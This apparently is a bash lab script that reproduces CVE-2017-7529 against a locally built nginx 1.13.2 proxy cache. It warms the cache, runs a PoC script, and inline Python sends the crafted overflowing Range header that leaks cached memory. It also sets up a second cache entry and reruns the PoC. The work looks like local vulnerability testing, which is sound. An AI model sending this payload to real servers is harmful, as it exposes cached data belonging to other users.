#!/usr/bin/env bash
LAB="$HOME/nginx-poc-lab"
POCLAB="/mnt/d/download/PoClab/PoCLab"
pkill -f "$LAB/nginx-1.13.2" 2>/dev/null || true
pkill -f backend-7529.py 2>/dev/null || true
sleep 1
python3 "$LAB/backend-7529.py" &
sleep 1
"$LAB/nginx-1.13.2/sbin/nginx" -c "$LAB/conf/7529.conf"
echo "=== headers ==="
curl -sI http://127.0.0.1:17529/
echo "=== warm cache ==="
curl -s http://127.0.0.1:17529/ >/dev/null
curl -sI http://127.0.0.1:17529/ | grep -i cache
echo "=== local poc ==="
python3 "$POCLAB/pocs/CVE-2017-7529/poc.py" http://127.0.0.1:17529/
echo "local_exit=$?"
echo "=== upstream-style range ==="
python3 <<'PY'
import requests
url="http://127.0.0.1:17529/"
r=requests.get(url)
cl=int(r.headers.get("Content-Length",0))
length=cl+623
hdr={"Range": f"bytes=-{length},-9223372036854{776000 - length}"}
r2=requests.get(url, headers=hdr)
print("CL", cl, "length", length)
print("range", hdr["Range"])
print("status", r2.status_code)
print("resp_headers", {k:v for k,v in r2.headers.items() if k.lower() in ('content-range','content-length','content-type')})
body=r2.content
print("body_len", len(body))
print("body_preview", repr(body[:200]))
print("Content-Range in body", b"Content-Range" in body or "Content-Range" in body.decode('latin1','replace'))
PY
echo "=== populate second cache entry ==="
cat >"$LAB/conf/7529b.conf" <<EOF
worker_processes 1;
error_log $LAB/7529-error.log info;
pid $LAB/7529.pid;
events { worker_connections 64; }
http {
    proxy_cache_path $LAB/cache levels=1:2 keys_zone=c:10m max_size=100m inactive=60m use_temp_path=off;
    upstream b { server 127.0.0.1:18081; }
    server {
        listen 17529;
        location / {
            proxy_cache c;
            proxy_cache_valid 200 10m;
            proxy_pass http://b;
        }
        location /other {
            proxy_cache c;
            proxy_cache_valid 200 10m;
            proxy_pass http://b/other;
        }
    }
}
EOF
pkill -f nginx-1.13.2 2>/dev/null; sleep 1
"$LAB/nginx-1.13.2/sbin/nginx" -c "$LAB/conf/7529b.conf"
curl -s http://127.0.0.1:17529/other >/dev/null
curl -s http://127.0.0.1:17529/ >/dev/null
curl -s http://127.0.0.1:17529/other >/dev/null
python3 "$POCLAB/pocs/CVE-2017-7529/poc.py" http://127.0.0.1:17529/
echo "after_multi_exit=$?"
